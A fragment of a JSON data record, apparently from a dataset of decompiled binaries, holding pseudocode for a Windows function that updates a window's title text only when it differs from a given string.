        "decompiled_code": "\nvoid fcn.140016530(int64_t arg1, int64_t lpString)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar auStack312 [32];\n    uchar uStack280;\n    uchar auStack279 [255];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack312;\n    if (arg1 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (lpString == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    uStack280 = 0;\n    fcn.14001bd50(auStack279, 0, 0xff);\n    if (uVar2 < 0x101) {\n        uVar3 = (*_sym.imp.USER32.dll_GetWindowTextA)(arg1, &uStack280);\n        if (uVar3 == uVar2) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&uStack280, lpString);\n            if (iVar4 == 0) goto code_r0x0001400165cd;\n        }\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(arg1, lpString);\ncode_r0x0001400165cd:\n    fcn.14001b410(uStack24 ^ auStack312);\n    return;\n}\n",
        "token_count": 374
    }
}